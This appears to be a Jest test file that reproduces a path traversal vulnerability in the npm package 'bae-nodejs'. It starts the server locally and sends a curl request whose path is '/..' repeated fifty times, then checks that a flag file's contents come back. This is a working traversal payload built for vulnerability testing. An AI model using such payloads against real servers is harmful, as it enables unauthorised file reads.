var execSync = require("child_process").execSync;
afterAll(() => {
  try {
    execSync("fuser -k 8080/tcp");
  } catch (e) {}
});
const path = require("path");
const { sleep } = require("sleep");
const pathToFlag = path.resolve(__dirname, "../flag.html");
function genstr(n) {
  return "/..".repeat(50) + pathToFlag;
}
test("Path Traversal in bae-nodejs", (done) => {
  expect.assertions(1);
  const pkg = require("bae-nodejs");
  const fs = require("fs");
  const { exec } = require("child_process");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require("child_process");
  try {
    a.execSync("fuser -k 8080/tcp", () => {});
  } catch (e) {}
  pkg.start(__dirname);
  let attack_string = `curl -v --path-as-is "http://127.0.0.1:18080${genstr()}"`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
